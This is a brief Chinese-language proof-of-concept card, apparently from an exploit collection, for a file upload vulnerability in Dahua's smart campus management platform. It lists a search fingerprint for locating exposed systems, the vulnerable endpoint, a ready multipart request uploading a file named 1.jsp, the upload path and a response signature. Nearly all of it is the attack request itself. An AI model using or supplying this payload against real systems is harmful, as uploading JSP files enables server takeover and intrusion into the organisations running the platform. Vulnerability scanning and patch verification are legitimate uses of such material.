# 大华智慧园区综合管理平台hasSubsystem存在文件上传漏洞

大华 ｜ 文件上传 ｜ —
- **指纹**：`app="dahua-智慧园区综合管理平台"`
- **请求**：`POST /emap/devicePoint_addImgIco?hasSubsystem=true HTTP/1.1`

**Payload**
```
--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT
Content-Disposition: form-data; name="upload"; filename="1.jsp"
Content-Type: application/octet-stream
Content-Transfer-Encoding: binary
123456
--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT--
文件路径 http://ip:port/upload/emap/society_new/+文件名
```
- **响应特征**：200 响应时间>=5s